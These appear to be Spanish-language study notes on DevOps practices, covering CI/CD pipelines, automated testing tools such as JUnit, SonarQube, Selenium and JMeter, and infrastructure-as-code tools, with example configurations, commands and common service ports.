## AUTOMATIZACION Y DEVOPS

**¿De qué trata?**
- Cultura y prácticas que unifican desarrollo (Dev) y operaciones (Ops)
- Automatización de procesos de software desde desarrollo hasta producción
- Integración continua y entrega continua (CI/CD)

**¿Por qué se utiliza?**
- Acelerar tiempo de entrega de software
- Mejorar calidad y estabilidad de aplicaciones
- Reducir errores humanos mediante automatización
- Facilitar colaboración entre equipos

**Ventajas/Beneficios:**
- Despliegues más rápidos y frecuentes
- Detección temprana de errores
- Mayor confiabilidad en producción
- Feedback continuo
- Escalabilidad mejorada

**Desventajas:**
- Curva de aprendizaje inicial alta
- Inversión en herramientas y formación
- Requiere cambio cultural organizacional
- Complejidad en implementación inicial

**Ciclo de Vida DevOps:**
1. **Plan** → Planificación y requisitos
2. **Code** → Desarrollo de código
3. **Build** → Compilación y empaquetado
4. **Test** → Pruebas automatizadas
5. **Release** → Preparación para despliegue
6. **Deploy** → Despliegue a producción
7. **Operate** → Operación y monitoreo
8. **Monitor** → Retroalimentación y mejora

**Herramientas Comunes:**
- **CI/CD:** Jenkins (8080), GitLab CI, GitHub Actions, Azure DevOps
- **Contenedores:** Docker (2375/2376), Kubernetes (6443, 8080)
- **Monitoreo:** Prometheus (9090), Grafana (3000), ELK Stack (9200, 5601)
- **Versionamiento:** Git, GitHub, GitLab, Bitbucket

**Puertos Comunes:**
- Jenkins: 8080
- Docker API: 2375 (HTTP), 2376 (HTTPS)
- Kubernetes API: 6443
- SonarQube: 9000
- Nexus: 8081

---

### Fundamentos sobre DevOps

**¿De qué trata?**
- Filosofía de trabajo colaborativo entre desarrollo y operaciones
- Principios de automatización, medición y compartición
- Cultura de mejora continua

**¿Por qué se utiliza?**
- Romper silos entre equipos
- Acelerar entregas de valor al cliente
- Aumentar calidad del software
- Reducir fallos en producción

**Conceptos Fundamentales:**

**1. Cultura DevOps**
- Colaboración y comunicación
- Responsabilidad compartida
- Transparencia en procesos
- Aprendizaje continuo

**2. Automatización**
- Build automatizado
- Testing automatizado
- Despliegue automatizado
- Configuración como código

**3. CI/CD (Integración/Entrega Continua)**
- **Integración Continua:** Merge frecuente de código
- **Entrega Continua:** Software siempre listo para producción
- **Despliegue Continuo:** Automatización completa a producción

**4. Infraestructura como Código (IaC)**
- Gestión de infraestructura mediante código
- Versionamiento de infraestructura
- Reproducibilidad de entornos

**5. Monitoreo y Logging**
- Observabilidad de sistemas
- Métricas en tiempo real
- Alertas proactivas

**Ejemplo de Uso:**
```bash
# Pipeline básico CI/CD
1. Desarrollador hace commit → Git
2. Webhook activa Jenkins
3. Jenkins ejecuta build y tests
4. Si pasa, genera artefacto
5. Despliega a entorno staging
6. Tests de aceptación
7. Aprobación manual/automática
8. Despliegue a producción
```

**Ventajas:**
- Entregas más rápidas (días → horas)
- Mayor estabilidad (99.9% uptime)
- Recuperación rápida ante fallos
- Innovación acelerada

**Desventajas:**
- Requiere inversión inicial significativa
- Necesita compromiso organizacional
- Cambio de mentalidad complejo
- Riesgo de over-automation

**Habilitación:**
- Capacitación de equipos en prácticas DevOps
- Implementar herramientas CI/CD
- Establecer métricas (DORA metrics)
- Crear cultura de feedback

---

### Buenas prácticas que son requeridas en un entorno DevOps

**¿De qué trata?**
- Conjunto de principios y metodologías probadas
- Estándares para implementación efectiva de DevOps
- Prácticas que garantizan éxito en adopción

**¿Por qué se utiliza?**
- Evitar errores comunes en implementación
- Asegurar consistencia en procesos
- Maximizar beneficios de DevOps
- Reducir riesgos operacionales

**Prácticas Principales:**

**1. Versionamiento de Código**
- Todo en repositorio Git
- Branching strategy (GitFlow, Trunk-based)
- Code reviews obligatorios
- Commits atómicos y descriptivos

**Ejemplo:**
```bash
# GitFlow básico
git checkout -b feature/nueva-funcionalidad
git commit -m "feat: agregar autenticación JWT"
git push origin feature/nueva-funcionalidad
# Pull Request → Code Review → Merge
```

**2. Integración Continua (CI)**
- Commits diarios al repositorio principal
- Build automático en cada commit
- Tests automáticos obligatorios
- Feedback rápido (< 10 minutos)

**Configuración Jenkins:**
```groovy
pipeline {
    agent any
    stages {
        stage('Build') {
            steps { sh 'npm install' }
        }
        stage('Test') {
            steps { sh 'npm test' }
        }
    }
}
```

**3. Entrega Continua (CD)**
- Despliegues automatizados
- Ambientes idénticos (dev, staging, prod)
- Rollback automático si falla
- Feature flags para control

**4. Infraestructura como Código**
- Terraform, CloudFormation, Ansible
- Infraestructura versionada en Git
- Environments reproducibles
- No configuración manual

**5. Monitoreo y Observabilidad**
- Logs centralizados (ELK Stack)
- Métricas de aplicación (Prometheus)
- Dashboards visuales (Grafana)
- Alertas configuradas

**6. Seguridad (DevSecOps)**
- Escaneo de vulnerabilidades
- Secretos en vaults (HashiCorp Vault)
- Análisis estático de código (SonarQube)
- Compliance automatizado

**7. Comunicación y Colaboración**
- Daily standups
- Retrospectivas regulares
- Documentación como código
- ChatOps (Slack, Teams integrados)

**8. Testing Automatizado**
- Unit tests (>80% cobertura)
- Integration tests
- End-to-end tests
- Performance tests

**9. Configuración Centralizada**
- Variables de entorno
- Config servers (Spring Cloud Config)
- Separación dev/staging/prod
- No hardcodear credenciales

**10. Despliegues Seguros**
- Blue-Green deployments
- Canary releases
- Rolling updates
- Inmutabilidad de artefactos

**Ventajas:**
- Reducción de errores humanos (80%)
- Time-to-market más rápido
- Mayor calidad de software
- Equipos más productivos

**Desventajas:**
- Requiere disciplina constante
- Inversión en capacitación
- Herramientas pueden ser costosas
- Overhead inicial de configuración

**Servicios y Puertos:**
- **Git Server:** 22 (SSH), 443 (HTTPS)
- **Jenkins:** 8080, 50000 (agents)
- **SonarQube:** 9000
- **Artifactory/Nexus:** 8081

**Habilitación:**
1. Definir pipeline estándar
2. Configurar herramientas CI/CD
3. Establecer políticas de branching
4. Implementar code review obligatorio
5. Configurar gates de calidad
6. Entrenar equipos

---

### Automatización del testing en un entorno DevOps

**¿De qué trata?**
- Ejecución automática de pruebas en pipeline CI/CD
- Testing continuo sin intervención manual
- Validación de calidad en cada etapa

**¿Por qué se utiliza?**
- Detección temprana de bugs
- Reducir tiempo de QA manual
- Garantizar calidad consistente
- Acelerar ciclo de desarrollo

**Tipos de Tests Automatizados:**

**1. Unit Tests (Pruebas Unitarias)**
- Testean funciones/métodos individuales
- Ejecución muy rápida (milisegundos)
- Mayor cobertura posible (>80%)

**Ejemplo (Jest - JavaScript):**
```javascript
// sum.test.js
test('suma 1 + 2 es igual a 3', () => {
  expect(sum(1, 2)).toBe(3);
});
```

**2. Integration Tests**
- Testean interacción entre componentes
- Verifican APIs, bases de datos
- Tiempo medio de ejecución

**Ejemplo (Python - pytest):**
```python
def test_api_endpoint():
    response = client.get('/api/users')
    assert response.status_code == 200
    assert len(response.json()) > 0
```

**3. End-to-End Tests (E2E)**
- Simulan comportamiento de usuario
- Testean flujo completo
- Más lentos pero críticos

**Ejemplo (Selenium/Cypress):**
```javascript
// Cypress
describe('Login Flow', () => {
  it('usuario puede iniciar sesión', () => {
    cy.visit('/login')
    cy.get('#email').type('user@example.com')
    cy.get('#password').type('password123')
    cy.get('button[type=submit]').click()
    cy.url().should('include', '/dashboard')
  })
})
```

**4. Performance Tests**
- Pruebas de carga y estrés
- Verifican tiempos de respuesta
- Identifican cuellos de botella

**Ejemplo (JMeter/K6):**
```javascript
// k6 load test
import http from 'k6/http';
export let options = { vus: 100, duration: '30s' };
export default function() {
  http.get('https://api.example.com/users');
}
```

**5. Security Tests**
- Escaneo de vulnerabilidades
- Análisis de dependencias
- Penetration testing automatizado

**Herramientas Comunes:**

**Unit/Integration:**
- **JavaScript:** Jest, Mocha, Jasmine
- **Python:** pytest, unittest
- **Java:** JUnit, TestNG
- **C#:** NUnit, xUnit

**E2E:**
- Selenium (4444)
- Cypress (navegador)
- Playwright
- Puppeteer

**Performance:**
- JMeter
- K6
- Gatling
- Apache Bench

**Security:**
- OWASP ZAP
- SonarQube (9000)
- Snyk
- Checkmarx

**Ciclo de Ejecución:**
```bash
# Pipeline de Testing
1. Commit código → Git
2. Trigger CI pipeline
3. Build aplicación
4. Run Unit Tests (2-5 min)
5. Run Integration Tests (5-10 min)
6. Deploy a staging
7. Run E2E Tests (10-20 min)
8. Run Performance Tests
9. Security Scan
10. Generar reporte
11. Si todo pasa → Deploy a producción
```

**Configuración CI (GitHub Actions):**
```yaml
name: Test Pipeline
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Run Unit Tests
        run: npm test
      - name: Run Integration Tests
        run: npm run test:integration
      - name: Upload Coverage
        run: codecov -t ${{ secrets.CODECOV_TOKEN }}
```

**Métricas de Testing:**
- **Code Coverage:** >80% deseable
- **Test Pass Rate:** >95%
- **Time to Test:** <15 minutos
- **Flaky Tests:** <2%

**Ventajas:**
- Detección inmediata de regresiones
- Confianza en despliegues
- Documentación viva del código
- Reducción de bugs en producción (70%)

**Desventajas:**
- Mantenimiento de tests
- Tiempo de ejecución en pipelines
- Flaky tests generan frustración
- Inversión inicial en escribir tests

**Puertos de Servicios:**
- Selenium Grid: 4444
- SonarQube: 9000
- Jenkins: 8080
- Test Databases: 5432 (PostgreSQL), 3306 (MySQL)

**Habilitación:**
1. Configurar framework de testing
2. Escribir tests para código crítico
3. Integrar en pipeline CI/CD
4. Establecer umbral de cobertura
5. Configurar reportes automáticos
6. Implementar test parallelization
7. Configurar entornos de test aislados

**Ejemplo Completo Pipeline:**
```yaml
# .gitlab-ci.yml
stages:
  - build
  - test
  - security
  - deploy

unit-test:
  stage: test
  script:
    - npm install
    - npm run test:unit
  coverage: '/Lines\s*:\s*(\d+\.\d+)%/'

integration-test:
  stage: test
  services:
    - postgres:13
  script:
    - npm run test:integration

security-scan:
  stage: security
  script:
    - sonar-scanner -Dsonar.host.url=$SONAR_URL

e2e-test:
  stage: test
  script:
    - npm run test:e2e
  artifacts:
    when: on_failure
    paths:
      - cypress/screenshots/
```

---

### Fundamentos de Infraestructura como Código y herramientas

**¿De qué trata?**
- Gestión de infraestructura mediante código versionado
- Definición declarativa de recursos (servers, redes, storage)
- Automatización completa de provisioning

**¿Por qué se utiliza?**
- Eliminar configuración manual propensa a errores
- Reproducibilidad de entornos
- Versionamiento de infraestructura
- Escalabilidad rápida

**Conceptos Fundamentales:**

**1. Declarativo vs Imperativo**
- **Declarativo:** Define estado deseado (Terraform, CloudFormation)
- **Imperativo:** Define pasos a ejecutar (Ansible, scripts)

**2. Idempotencia**
- Ejecutar múltiples veces → mismo resultado
- No duplica recursos existentes
- Seguro re-ejecutar

**3. State Management**
- Archivo de estado rastrea recursos
- Sincronización real vs definido
- Backend remoto para equipos

**Herramientas Principales:**

**1. Terraform (HashiCorp)**
**De qué trata:**
- Herramienta IaC multi-cloud
- Lenguaje HCL (HashiCorp Configuration Language)
- Provisioning de cualquier proveedor

**Ejemplo:**
```hcl
# main.tf - AWS EC2
provider "aws" {
  region = "us-east-1"
}

resource "aws_instance" "web_server" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t2.micro"
  
  tags = {
    Name = "WebServer"
    Environment = "Production"
  }
}

resource "aws_security_group" "web_sg" {
  name = "web-security-group"
  
  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
```

**Ciclo de Vida Terraform:**
```bash
# 1. Inicializar
terraform init

# 2. Planificar cambios
terraform plan

# 3. Aplicar cambios
terraform apply

# 4. Ver estado
terraform show

# 5. Destruir recursos
terraform destroy
```

**Puertos:** N/A (CLI tool)
**State Storage:** S3, Terraform Cloud, Azure Storage

---

**2. Ansible (Red Hat)**
**De qué trata:**
- Configuración y orquestación
- Agentless (usa SSH)
- Playbooks en YAML

**Ejemplo:**
```yaml
# playbook.yml - Instalar Nginx
---
- name: Configurar Web Server
  hosts: webservers
  become: yes
  
  tasks:
    - name: Instalar Nginx
      apt:
        name: nginx
        state: present
        update_cache: yes
    
    - name: Iniciar Nginx
      service:
        name: nginx
        state: started
        enabled: yes
    
    - name: Copiar configuración
      copy:
        src: nginx.conf
        dest: /etc/nginx/nginx.conf
      notify: Reiniciar Nginx
  
  handlers:
    - name: Reiniciar Nginx
      service:
        name: nginx
        state: restarted
```

**Ejecución:**
```bash
# Ejecutar playbook
ansible-playbook -i inventory.ini playbook.yml

# Verificar conectividad
ansible all -m ping -i inventory.ini

# Ejecutar comando ad-hoc
ansible webservers -a "df -h" -i inventory.ini
```

**Puertos:** 22 (SSH)
**Inventario:** Define hosts y grupos

---

**3. Docker (Containerización)**
**De qué trata:**
- Empaquetado de aplicaciones en contenedores
- Portabilidad entre entornos
- Aislamiento de procesos

**Ejemplo Dockerfile:**
```dockerfile
# Dockerfile - Node.js app
FROM node:16-alpine

WORKDIR /app

COPY package*.json ./
RUN npm install --production

COPY . .

EXPOSE 3000

CMD ["node", "server.js"]
```

**Docker Compose:**
```yaml
# docker-compose.yml
version: '3.8'
services:
  web:
    build: .
    ports:
      - "3000:3000"
    environment:
      - DB_HOST=db
    depends_on:
      - db
  
  db:
    image: postgres:13
    environment:
      POSTGRES_PASSWORD: example
    volumes:
      - db-data:/var/lib/postgresql/data

volumes:
  db-data:
```

**Comandos:**
```bash
# Build imagen
docker build -t myapp:1.0 .

# Ejecutar contenedor
docker run -d -p 3000:3000 --name myapp myapp:1.0

# Docker Compose
docker-compose up -d
docker-compose logs -f
docker-compose down
```

**Puertos Docker:**
- Docker daemon: 2375 (HTTP), 2376 (HTTPS)
- Registry: 5000

---

**4. Kubernetes (Orquestación)**
**De qué trata:**
- Orquestación de contenedores a escala
- Auto-scaling, self-healing
- Load balancing automático

**Ejemplo:**
```yaml
# deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web-app
spec:
  replicas: 3
  selector:
    matchLabels:
      app: web
  template:
    metadata:
      labels:
        app: web
    spec:
      containers:
      - name: web
        image: myapp:1.0
        ports:
        - containerPort: 3000

---
# service.yaml
apiVersion: v1
kind: Service
metadata:
  name: web-service
spec:
  type: LoadBalancer
  selector:
    app: web
  ports:
  - port: 80
    targetPort: 3000
```

**Comandos:**
```bash
# Aplicar configuración
kubectl apply -f deployment.yaml

# Ver pods
kubectl get pods

# Ver logs
kubectl logs -f pod-name

# Escalar
kubectl scale deployment web-app --replicas=5
```

**Puertos Kubernetes:**
- API Server: 6443
- kubelet: 10250
- kube-proxy: 10256
- NodePort range: 30000-32767

---

**5. CloudFormation (AWS)**
**De qué trata:**
- IaC nativo de AWS
- Templates JSON/YAML
- Stack management

**Ejemplo:**
```yaml
# template.yaml
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  WebServer:
    Type: AWS::EC2::Instance
    Properties:
      ImageId: ami-0c55b159cbfafe1f0
      InstanceType: t2.micro
      SecurityGroups:
        - !Ref WebSecurityGroup
  
  WebSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      GroupDescription: Enable HTTP
      SecurityGroupIngress:
        - IpProtocol: tcp
          FromPort: 80
          ToPort: 80
          CidrIp: 0.0.0.0/0
```

---

**Comparación de Herramientas:**

| Herramienta | Tipo | Uso Principal | Multi-Cloud |
|-------------|------|---------------|-------------|
| Terraform | Provisioning | Crear infraestructura | ✅ Sí |
| Ansible | Config Management | Configurar servers | ✅ Sí |
| Docker | Containerización | Empaquetar apps | ✅ Sí |
| Kubernetes | Orquestación | Gestionar contenedores | ✅ Sí |
| CloudFormation | Provisioning | AWS exclusivo | ❌ No |

**Ventajas IaC:**
- Infraestructura reproducible
- Versionamiento completo
- Documentación automática
- Disaster recovery rápido
- Ambientes idénticos
- Reducción de errores (90%)

**Desventajas:**
- Curva de aprendizaje
- Complejidad inicial
- Requiere validación continua
- State drift puede ocurrir
- Costo de herramientas enterprise

**Ciclo de Vida Completo:**
```bash
# 1. Definir infraestructura en código
# 2. Versionar en Git
# 3. Code review
# 4. Plan/Dry-run
# 5. Aplicar en dev
# 6. Validar
# 7. Aplicar en staging
# 8. Aplicar en producción
# 9. Monitorear
# 10. Iterar
```

**Habilitación:**
1. Elegir herramienta según necesidad
2. Definir estructura de proyecto
3. Configurar state backend
4. Implementar módulos reutilizables
5. Integrar en pipeline CI/CD
6. Establecer políticas (Sentinel, OPA)
7. Capacitar equipo
8. Implementar gradualmente

**Servicios Comunes en IaC:**
- **Compute:** EC2, VMs, Containers
- **Networking:** VPC, Subnets, Load Balancers
- **Storage:** S3, EBS, Blob Storage
- **Database:** RDS, DynamoDB, CosmosDB
- **Monitoring:** CloudWatch, Azure Monitor
- **Security:** IAM, Security Groups, Firewalls

**IPs/Endpoints típicos:**
- AWS API: `*.amazonaws.com:443`
- Azure API: `management.azure.com:443`
- GCP API: `*.googleapis.com:443`
- Terraform Cloud: `app.terraform.io:443`

---

### Tipos de pruebas: Unitarias (jUnit), calidad y cobertura de código (SonarQube)

**¿De qué trata?**
- Pruebas unitarias: Testeo de componentes individuales del código
- Análisis de calidad: Evaluación estática del código
- Cobertura: Porcentaje de código ejecutado por tests

**¿Por qué se utiliza?**
- Garantizar funcionamiento correcto de funciones aisladas
- Medir calidad del código y detectar code smells
- Asegurar que el código está siendo testeado
- Identificar vulnerabilidades y bugs tempranamente

---

**JUNIT (Framework de Testing Java)**

**De qué trata:**
- Framework para pruebas unitarias en Java
- Estándar de facto para testing en JVM
- Anotaciones para definir tests y configuración

**Ejemplo de Uso:**
```java
import org.junit.jupiter.api.Test;
import static org.junit.jupiter.api.Assertions.*;

public class CalculatorTest {
    
    @Test
    public void testSum() {
        Calculator calc = new Calculator();
        assertEquals(5, calc.sum(2, 3));
    }
    
    @Test
    public void testDivideByZero() {
        Calculator calc = new Calculator();
        assertThrows(ArithmeticException.class, 
            () -> calc.divide(10, 0));
    }
    
    @BeforeEach
    public void setUp() {
        // Configuración antes de cada test
    }
    
    @AfterEach
    public void tearDown() {
        // Limpieza después de cada test
    }
}
```

**Ciclo de Vida JUnit:**
```java
// Orden de ejecución
@BeforeAll      // Una vez antes de todos los tests
@BeforeEach     // Antes de cada test
@Test           // Ejecutar test
@AfterEach      // Después de cada test
@AfterAll       // Una vez después de todos los tests
```

**Ejecución:**
```bash
# Maven
mvn test

# Gradle
gradle test

# Directamente
java -jar junit-platform-console-standalone.jar --scan-classpath
```

**Ventajas:**
- Integración con IDEs y build tools
- Anotaciones simples y claras
- Mock support con Mockito
- Amplia comunidad y documentación

**Desventajas:**
- Solo para JVM languages
- Configuración inicial puede ser compleja
- Tests lentos si no se optimizan

**Puertos:** N/A (biblioteca de testing)

**Habilitación Maven:**
```xml
<dependency>
    <groupId>org.junit.jupiter</groupId>
    <artifactId>junit-jupiter</artifactId>
    <version>5.9.0</version>
    <scope>test</scope>
</dependency>
```

---

**SONARQUBE (Análisis de Calidad de Código)**

**De qué trata:**
- Plataforma de análisis estático de código
- Detecta bugs, vulnerabilidades, code smells
- Dashboard de métricas de calidad

**¿Por qué se utiliza?**
- Mantener estándares de código
- Identificar deuda técnica
- Detectar vulnerabilidades de seguridad
- Medir cobertura de tests

**Conceptos Fundamentales:**

**1. Métricas Principales:**
- **Bugs:** Errores que afectan funcionalidad
- **Vulnerabilidades:** Fallos de seguridad
- **Code Smells:** Código mal estructurado
- **Coverage:** % de código cubierto por tests
- **Duplicaciones:** Código duplicado
- **Complejidad Ciclomática:** Complejidad del código

**2. Quality Gates:**
- Umbrales que debe pasar el código
- Bloquea merge si no cumple estándares
- Configurable por proyecto

**Ejemplo Quality Gate:**
```
Coverage: > 80%
Duplications: < 3%
Maintainability Rating: A
Security Rating: A
Bugs: 0
Vulnerabilities: 0
```

**Instalación y Configuración:**
```bash
# Docker
docker run -d --name sonarqube \
  -p 9000:9000 \
  sonarqube:latest

# Acceso: http://localhost:9000
# Usuario/Password inicial: admin/admin
```

**Análisis de Proyecto (Maven):**
```bash
# Ejecutar análisis
mvn clean verify sonar:sonar \
  -Dsonar.projectKey=myproject \
  -Dsonar.host.url=http://localhost:9000 \
  -Dsonar.login=mytoken
```

**Configuración sonar-project.properties:**
```properties
sonar.projectKey=my-project
sonar.projectName=My Project
sonar.projectVersion=1.0
sonar.sources=src/main
sonar.tests=src/test
sonar.java.binaries=target/classes
sonar.coverage.jacoco.xmlReportPaths=target/site/jacoco/jacoco.xml
```

**Pipeline CI/CD con SonarQube:**
```yaml
# GitLab CI
sonarqube-check:
  stage: quality
  script:
    - mvn clean verify sonar:sonar
  only:
    - merge_requests
    - main
```

**Integración con Jenkins:**
```groovy
pipeline {
    agent any
    stages {
        stage('SonarQube Analysis') {
            steps {
                withSonarQubeEnv('SonarQube') {
                    sh 'mvn sonar:sonar'
                }
            }
        }
        stage('Quality Gate') {
            steps {
                timeout(time: 1, unit: 'HOURS') {
                    waitForQualityGate abortPipeline: true
                }
            }
        }
    }
}
```

**Ventajas:**
- Análisis profundo multi-lenguaje
- Dashboard centralizado
- Histórico de métricas
- Integración CI/CD nativa
- Detecta vulnerabilidades OWASP

**Desventajas:**
- Consume recursos significativos
- Versión enterprise es costosa
- Configuración inicial compleja
- Puede generar falsos positivos

**Puertos:**
- SonarQube Server: 9000
- SonarQube Database: 5432 (PostgreSQL)

**Servicios Utilizados:**
- PostgreSQL (base de datos)
- Elasticsearch (búsqueda)
- Web Server (interfaz)

**Lenguajes Soportados:**
- Java, JavaScript, TypeScript, Python, C#, PHP, Go, Kotlin, Ruby, C/C++, etc.

**Métricas de Cobertura con JaCoCo:**
```xml
<!-- pom.xml -->
<plugin>
    <groupId>org.jacoco</groupId>
    <artifactId>jacoco-maven-plugin</artifactId>
    <version>0.8.8</version>
    <executions>
        <execution>
            <goals>
                <goal>prepare-agent</goal>
            </goals>
        </execution>
        <execution>
            <id>report</id>
            <phase>test</phase>
            <goals>
                <goal>report</goal>
            </goals>
        </execution>
    </executions>
</plugin>
```

**Habilitación Completa:**
1. Instalar SonarQube Server
2. Configurar base de datos PostgreSQL
3. Crear proyecto y generar token
4. Configurar scanner en build tool
5. Definir Quality Gates
6. Integrar en pipeline CI/CD
7. Configurar webhooks
8. Establecer políticas de branches

---

### Tipos de pruebas: Funcionalidad front-end (Selenium), Carga y rendimiento (jMeter)

**¿De qué trata?**
- Testing de interfaces de usuario web
- Pruebas de carga y rendimiento de aplicaciones
- Simulación de comportamiento de usuarios
- Medición de capacidad del sistema

**¿Por qué se utiliza?**
- Validar funcionalidad desde perspectiva del usuario
- Asegurar que UI funciona correctamente
- Identificar límites de capacidad
- Detectar degradación de rendimiento

---

**SELENIUM (Testing Front-End)**

**De qué trata:**
- Framework para automatización de navegadores web
- Testing E2E de aplicaciones web
- Simulación de interacción de usuario

**Arquitectura Selenium:**
- **Selenium WebDriver:** API para controlar navegadores
- **Selenium Grid:** Ejecución paralela en múltiples navegadores
- **Selenium IDE:** Grabación y reproducción de tests

**Ejemplo de Uso (Java):**
```java
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.By;
import org.openqa.selenium.WebElement;

public class LoginTest {
    public static void main(String[] args) {
        // Configurar WebDriver
        System.setProperty("webdriver.chrome.driver", 
            "/path/to/chromedriver");
        WebDriver driver = new ChromeDriver();
        
        try {
            // Navegar
            driver.get("https://example.com/login");
            
            // Localizar elementos
            WebElement username = driver.findElement(
                By.id("username"));
            WebElement password = driver.findElement(
                By.id("password"));
            WebElement submitBtn = driver.findElement(
                By.cssSelector("button[type='submit']"));
            
            // Interactuar
            username.sendKeys("testuser");
            password.sendKeys("password123");
            submitBtn.click();
            
            // Verificar
            WebElement welcome = driver.findElement(
                By.className("welcome-message"));
            assert welcome.getText().contains("Welcome");
            
        } finally {
            driver.quit();
        }
    }
}
```

**Ejemplo Python (pytest + Selenium):**
```python
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import pytest

class TestLogin:
    @pytest.fixture
    def driver(self):
        driver = webdriver.Chrome()
        yield driver
        driver.quit()
    
    def test_successful_login(self, driver):
        driver.get("https://example.com/login")
        
        # Wait para elemento
        wait = WebDriverWait(driver, 10)
        username = wait.until(
            EC.presence_of_element_located((By.ID, "username"))
        )
        
        username.send_keys("testuser")
        driver.find_element(By.ID, "password").send_keys("pass123")
        driver.find_element(By.CSS_SELECTOR, "button").click()
        
        # Assertion
        assert "Dashboard" in driver.title
```

**Localizadores de Elementos:**
```java
// Por ID
driver.findElement(By.id("elementId"))

// Por Nombre
driver.findElement(By.name("elementName"))

// Por Clase CSS
driver.findElement(By.className("className"))

// Por CSS Selector
driver.findElement(By.cssSelector(".class > div"))

// Por XPath
driver.findElement(By.xpath("//div[@id='myDiv']/span"))

// Por Link Text
driver.findElement(By.linkText("Click Here"))
```

**Waits (Esperas):**
```java
// Implicit Wait
driver.manage().timeouts().implicitlyWait(10, TimeUnit.SECONDS);

// Explicit Wait
WebDriverWait wait = new WebDriverWait(driver, 10);
WebElement element = wait.until(
    ExpectedConditions.elementToBeClickable(By.id("btn"))
);
```

**Selenium Grid (Ejecución Paralela):**
```bash
# Iniciar Hub
java -jar selenium-server.jar hub

# Iniciar Node
java -jar selenium-server.jar node \
  --hub http://localhost:4444
```

**Configuración RemoteWebDriver:**
```java
DesiredCapabilities caps = new DesiredCapabilities();
caps.setBrowserName("chrome");
WebDriver driver = new RemoteWebDriver(
    new URL("http://localhost:4444/wd/hub"), caps
);
```

**Ventajas:**
- Soporte multi-navegador (Chrome, Firefox, Safari, Edge)
- Integración con frameworks de testing
- Ejecución paralela con Grid
- Gran comunidad y recursos

**Desventajas:**
- Tests pueden ser frágiles (cambios UI)
- Ejecución lenta comparado con unit tests
- Mantenimiento constante requerido
- Configuración de drivers compleja

**Puertos:**
- Selenium Grid Hub: 4444
- Selenium Node: 5555 (configurable)
- ChromeDriver: puerto aleatorio

**Navegadores Soportados:**
- Chrome (ChromeDriver)
- Firefox (GeckoDriver)
- Safari (SafariDriver)
- Edge (EdgeDriver)

**Habilitación:**
1. Instalar WebDriver para navegador
2. Agregar dependencia Selenium
3. Configurar driver path
4. Escribir tests
5. Integrar en pipeline CI/CD
6. Configurar headless mode para CI

---

**JMETER (Carga y Rendimiento)**

**De qué trata:**
- Herramienta de pruebas de carga y rendimiento
- Simulación de múltiples usuarios concurrentes
- Medición de tiempo de respuesta y throughput

**¿Por qué se utiliza?**
- Validar capacidad del sistema
- Identificar cuellos de botella
- Planificar escalabilidad
- Asegurar SLAs de rendimiento

**Conceptos Fundamentales:**

**1. Thread Group (Grupo de Usuarios)**
- Simula usuarios virtuales
- Configura cantidad y rampa de usuarios

**2. Samplers (Solicitudes)**
- HTTP Request, JDBC Request, FTP Request
- Define qué se va a testear

**3. Listeners (Resultados)**
- View Results Tree, Summary Report, Graph Results
- Visualización de resultados

**4. Assertions (Validaciones)**
- Verifican respuestas correctas
- Response Code, Response Time, Content

**Ejemplo Test Plan (.jmx):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<jmeterTestPlan version="1.2">
  <hashTree>
    <TestPlan>
      <stringProp name="TestPlan.name">API Load Test</stringProp>
    </TestPlan>
    <hashTree>
      <ThreadGroup>
        <stringProp name="ThreadGroup.num_threads">100</stringProp>
        <stringProp name="ThreadGroup.ramp_time">10</stringProp>
        <stringProp name="ThreadGroup.duration">60</stringProp>
      </ThreadGroup>
      <hashTree>
        <HTTPSamplerProxy>
          <stringProp name="HTTPSampler.domain">api.example.com</stringProp>
          <stringProp name="HTTPSampler.port">443</stringProp>
          <stringProp name="HTTPSampler.protocol">https</stringProp>
          <stringProp name="HTTPSampler.path">/api/users</stringProp>
          <stringProp name="HTTPSampler.method">GET</stringProp>
        </HTTPSamplerProxy>
      </hashTree>
    </hashTree>
  </hashTree>
</jmeterTestPlan>
```

**Ejecución GUI:**
```bash
# Windows
jmeter.bat

# Linux/Mac
./jmeter.sh
```

**Ejecución CLI (No-GUI):**
```bash
# Ejecutar test
jmeter -n -t testplan.jmx -l results.jtl

# Con reporte HTML
jmeter -n -t testplan.jmx \
  -l results.jtl \
  -e -o ./html-report

# Con propiedades personalizadas
jmeter -n -t testplan.jmx \
  -Jusers=100 -Jduration=300
```

**Configuración HTTP Request:**
```
Thread Group:
  - Threads: 100
  - Ramp-up: 10s (10 usuarios/segundo)
  - Duration: 300s (5 minutos)

HTTP Request:
  - Server: api.example.com
  - Port: 443
  - Protocol: https
  - Path: /api/products
  - Method: GET
  
Response Assertion:
  - Response Code: 200
  - Response Time: < 500ms
```

**Listeners Importantes:**

**1. Summary Report:**
```
Label | Samples | Average | Min | Max | Std.Dev | Error% | Throughput
API   | 10000   | 234ms   | 50ms| 2s  | 123ms   | 0.5%   | 150/sec
```

**2. Aggregate Report:**
- Median, 90th Percentile, 95th Percentile, 99th Percentile

**3. Response Time Graph:**
- Gráfico de tiempos en el tiempo

**Pipeline CI/CD:**
```yaml
# Jenkins Pipeline
stage('Performance Test') {
    steps {
        sh '''
            jmeter -n -t performance-test.jmx \
              -l results.jtl \
              -e -o report
        '''
        perfReport sourceDataFiles: 'results.jtl'
    }
}
```

**Ejemplo Avanzado - Parametrización:**
```bash
# CSV Data Set Config
users.csv:
username,password
user1,pass1
user2,pass2

# En HTTP Request usar:
${username}
${password}
```

**Distribución de Carga (Distributed Testing):**
```bash
# Server (Master)
jmeter-server

# Client ejecuta test en múltiples servers
jmeter -n -t test.jmx \
  -R server1,server2,server3 \
  -l results.jtl
```

**Métricas Clave:**
- **Throughput:** Transacciones por segundo
- **Response Time:** Tiempo promedio de respuesta
- **Error Rate:** Porcentaje de errores
- **Percentiles:** 90th, 95th, 99th percentile
- **Concurrent Users:** Usuarios simultáneos

**Ventajas:**
- Open source y gratuito
- Soporte múltiples protocolos (HTTP, JDBC, JMS, SOAP)
- Reportes detallados
- Extensible con plugins
